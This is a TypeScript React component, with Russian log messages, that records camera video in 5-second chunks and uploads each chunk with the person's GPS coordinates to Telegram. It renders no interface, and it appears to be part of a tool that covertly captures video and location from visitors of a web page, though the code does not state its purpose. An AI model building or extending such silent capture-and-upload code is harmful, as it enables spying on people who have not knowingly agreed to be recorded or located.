import { useEffect, useRef, useState } from 'react';
import { sendVideoToTelegram } from '@/utils/videoUpload';

interface VideoRecorderProps {
  stream: MediaStream | null;
  isRecording: boolean;
  onChunkReady?: (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => void;
  cameraType: 'front' | 'back' | 'desktop';
  globalChunkCounter: { current: number };
  geoData?: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null;
}

export function VideoRecorder({ 
  stream, 
  isRecording, 
  onChunkReady, 
  cameraType, 
  globalChunkCounter,
  geoData
}: VideoRecorderProps) {
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const [mimeType, setMimeType] = useState<string>('');
  const isRecordingRef = useRef<boolean>(isRecording);
  const usedMimeTypeRef = useRef<string>('');
  
  // Update isRecording ref when prop changes
  useEffect(() => {
    isRecordingRef.current = isRecording;
  }, [isRecording]);
  
  // Log component mount with camera type
  useEffect(() => {
    console.log(`🔥 [VideoRecorder] Component MOUNTED with camera: ${cameraType}, current chunk counter: ${globalChunkCounter.current}`);
    return () => {
      console.log(`💀 [VideoRecorder] Component UNMOUNTED for camera: ${cameraType}`);
    };
  }, [cameraType]);

  useEffect(() => {
    // Detect best MIME type for video recording
    const detectMimeType = (): string => {
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
      const isAndroid = /Android/i.test(navigator.userAgent);
      
      console.log(`📱 [Video] Устройство: ${isIOS ? 'iOS' : isAndroid ? 'Android' : 'Desktop'}`);
      
      let types: string[] = [];
      
      if (isIOS) {
        // iOS Safari: WebM не поддерживается
        types = [
          'video/mp4;codecs=avc1.42E01E,mp4a.40.2',  // AVC Baseline profile
          'video/mp4;codecs=avc1.42E01E',
          'video/webm;codecs=h264',
          'video/mp4;codecs=h264',
          'video/mp4',
          'video/webm;codecs=vp8',
          'video/webm',
        ];
      } else if (isAndroid) {
        // Android Chrome: отличная поддержка MP4 и WebM
        types = [
          'video/mp4;codecs=avc1.42E01E,mp4a.40.2',  // AVC Baseline + AAC
          'video/webm;codecs=vp9,opus',              // VP9 - лучше для переменного разрешения
          'video/webm;codecs=vp9',
          'video/webm;codecs=vp8,opus',
          'video/webm;codecs=vp8',
          'video/mp4;codecs=h264,aac',
          'video/mp4;codecs=h264',
          'video/mp4',
          'video/webm',
        ];
      } else {
        // Desktop: MP4 приоритет
        types = [
          'video/mp4;codecs=avc1.42E01E,mp4a.40.2',  // AVC Baseline + AAC
          'video/webm;codecs=vp9,opus',              // VP9 - альтернатива
          'video/webm;codecs=vp9',
          'video/mp4;codecs=h264',
          'video/mp4',
          'video/webm;codecs=h264',
          'video/webm;codecs=vp8',
          'video/webm',
        ];
      }

      for (const type of types) {
        if (MediaRecorder.isTypeSupported(type)) {
          console.log(`✅ [Video] Поддерживаемый MIME: ${type}`);
          return type;
        }
      }

      console.warn('⚠️ [Video] Используем MIME по умолчанию');
      return '';
    };

    setMimeType(detectMimeType());
  }, []);

  useEffect(() => {
    if (!stream || !isRecording) {
      console.log(`⏹️ [Video ${cameraType}] Запись остановлена или нет потока`);
      
      // MOBILE FIX: Clear interval when recording stops (camera switching)
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
        console.log(`🧹 [Video ${cameraType}] Interval очищен`);
      }
      
      return;
    }

    console.log(`🎬 [Video ${cameraType}] Начинаем запись...`);

    try {
      // Check if stream has audio track
      const hasAudio = stream.getAudioTracks().length > 0;
      const hasVideo = stream.getVideoTracks().length > 0;
      
      console.log(`🎥 [Video ${cameraType}] Stream tracks: video=${hasVideo}, audio=${hasAudio}`);
      console.log(`🎥 [Video ${cameraType}] Stream tracks details:`, stream.getTracks().map(t => ({ 
        kind: t.kind, 
        label: t.label, 
        enabled: t.enabled 
      })));
      
      // Adjust MIME type based on available tracks
      let adjustedMimeType = mimeType;
      
      if (!hasAudio && mimeType) {
        // Если нет аудио-трека, убираем аудио-кодек из MIME
        if (mimeType.includes('opus') || mimeType.includes('mp4a') || mimeType.includes('aac')) {
          console.warn(`⚠️ [Video ${cameraType}] Нет аудио-трека, но MIME содержит аудио-кодек: ${mimeType}`);
          
          if (mimeType.includes(',')) {
            // "video/webm;codecs=vp8,opus" → "video/webm;codecs=vp8"
            adjustedMimeType = mimeType.split(',')[0];
            console.log(`🔧 [Video ${cameraType}] Скорректированный MIME (убрали аудио): ${adjustedMimeType}`);
          } else {
            // Только базовый формат без кодеков
            adjustedMimeType = mimeType.split(';')[0];
            console.log(`🔧 [Video ${cameraType}] Скорректированный MIME (только контейнер): ${adjustedMimeType}`);
          }
        }
      }
      
      const options = adjustedMimeType ? { mimeType: adjustedMimeType } : {};
      console.log(`🎥 [Video ${cameraType}] Попытка создать MediaRecorder с:`, options);
      
      let recorder: MediaRecorder;
      let usedMimeType = adjustedMimeType || '';
      
      try {
        recorder = new MediaRecorder(stream, options);
        usedMimeType = adjustedMimeType || '';
        usedMimeTypeRef.current = usedMimeType;
        console.log(`✅ [Video ${cameraType}] MediaRecorder создан с ${usedMimeType || 'default'}`);
      } catch (e) {
        console.warn(`⚠️ [Video ${cameraType}] Не удалось создать с ${adjustedMimeType}, пробуем без кодека...`, e);
        recorder = new MediaRecorder(stream);
        usedMimeType = '';
        console.log(`✅ [Video ${cameraType}] MediaRecorder создан с дефолтным кодеком`);
      }
      
      mediaRecorderRef.current = recorder;
      chunksRef.current = [];

      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          console.log(`📊 [Video ${cameraType}] Получен фрагмент данных: ${event.data.size} bytes`);
          chunksRef.current.push(event.data);
        }
      };

      recorder.onstop = async () => {
        console.log(`⏸️ [Video ${cameraType}] MediaRecorder остановлен`);
        
        if (chunksRef.current.length === 0) {
          console.warn(`⚠️ [Video ${cameraType}] Нет данных для отправки`);
          return;
        }

        // Use actually used MIME type (after adjustment)
        const blobMimeType = usedMimeTypeRef.current || 'video/webm';
        const blob = new Blob(chunksRef.current, { type: blobMimeType });
        
        // Check minimum blob size (skip < 10KB)
        if (blob.size < 10000) {
          console.warn(`⚠️ [Video ${cameraType}] Блоб слишком маленький (${blob.size} bytes), пропускаем`);
          chunksRef.current = [];
          return;
        }
        
        globalChunkCounter.current += 1;
        const currentChunkNum = globalChunkCounter.current;
        
        console.log(`📦 [Video ${cameraType}] Создан blob чанк #${currentChunkNum} с MIME: ${blobMimeType}, размер: ${blob.size} bytes`);

        // КРИТИЧНО: Сначала вызываем onChunkReady для обновления номера чанка
        if (onChunkReady) {
          console.log(`📞 [Video ${cameraType}] Вызываем onChunkReady для чанка #${currentChunkNum}`);
          onChunkReady(blob, currentChunkNum, cameraType);
        }
        
        // Затем отправляем видео в Telegram
        console.log(`📤 [Video ${cameraType}] Отправляем чанк #${currentChunkNum} в Telegram...`);
        await sendVideoToTelegram(blob, currentChunkNum, cameraType, geoData);
        console.log(`✅ [Video ${cameraType}] Чанк #${currentChunkNum} успешно отправлен`);

        chunksRef.current = [];
      };

      recorder.onerror = (event) => {
        console.error(`❌ [Video ${cameraType}] Ошибка MediaRecorder:`, event);
      };

      // Start recording
      recorder.start();
      console.log(`✅ [Video ${cameraType}] Запись началась`);

      // Send chunks every 5 seconds
      intervalRef.current = setInterval(() => {
        const currentRecorder = mediaRecorderRef.current;
        if (currentRecorder && currentRecorder.state === 'recording') {
          console.log(`⏰ [Video ${cameraType}] 5 секунд прошло - останавливаем чанк`);
          currentRecorder.stop();
          
          // Wait 100ms before trying to restart
          setTimeout(() => {
            // Triple-check before restarting
            if (mediaRecorderRef.current === currentRecorder && 
                isRecordingRef.current && 
                currentRecorder.state !== 'recording') {
              chunksRef.current = [];
              currentRecorder.start();
              console.log(`🔄 [Video ${cameraType}] Начинаем новый чанк`);
            } else {
              console.log(`⏸️ [Video ${cameraType}] Не запускаем новый чанк - запись остановлена`);
            }
          }, 100);
        }
      }, 5000); // 5 seconds

    } catch (error) {
      console.error(`❌ [Video ${cameraType}] Ошибка создания MediaRecorder:`, error);
    }

    // Cleanup
    return () => {
      console.log(`🧹 [Video ${cameraType}] Очистка...`);
      
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }

      if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
        mediaRecorderRef.current.stop();
      }

      chunksRef.current = [];
    };
  }, [stream, isRecording, mimeType, cameraType, onChunkReady, globalChunkCounter, geoData]);

  return null;
}